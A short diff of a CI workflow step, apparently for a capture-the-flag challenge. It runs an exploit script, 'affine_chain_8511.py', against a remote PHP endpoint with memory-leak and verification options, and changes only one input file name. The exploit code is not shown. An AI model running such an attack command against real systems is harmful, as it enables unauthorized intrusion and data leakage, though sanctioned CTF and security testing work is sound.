@@ -31,7 +31,7 @@ jobs:
           tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
           cd /tmp/cf-action-bundle
           set +e
-          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-all-windows-20000-files160.bin --query-order 1234 --leak-length 0x20000 --pipeline-pairs > /tmp/cloudflare-proof.log 2>&1
+          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-all-windows-tagged-20000-files160.bin --query-order 1234 --leak-length 0x20000 --pipeline-pairs > /tmp/cloudflare-proof.log 2>&1
           status=$?
           cat /tmp/cloudflare-proof.log
           exit "$status"
